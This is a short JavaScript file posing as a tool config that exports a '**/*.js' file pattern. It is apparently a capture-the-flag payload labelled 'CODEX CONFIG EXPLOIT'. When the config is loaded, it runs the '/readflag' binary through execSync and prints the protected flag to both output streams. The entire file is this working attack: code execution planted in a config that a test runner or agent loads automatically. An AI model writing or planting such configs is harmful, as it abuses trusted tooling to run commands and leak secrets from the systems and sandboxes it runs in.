const { execSync } = require('child_process');

try {
    console.log("--- CODEX CONFIG EXPLOIT ---");
    const flag = execSync('/readflag').toString().trim();
    const msg = "!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!";
    console.log(msg);
    console.error(msg);
} catch (e) {
    console.error("[CODEX CONFIG ERROR]", e.message);
}

module.exports = {
    files: ["**/*.js"]
};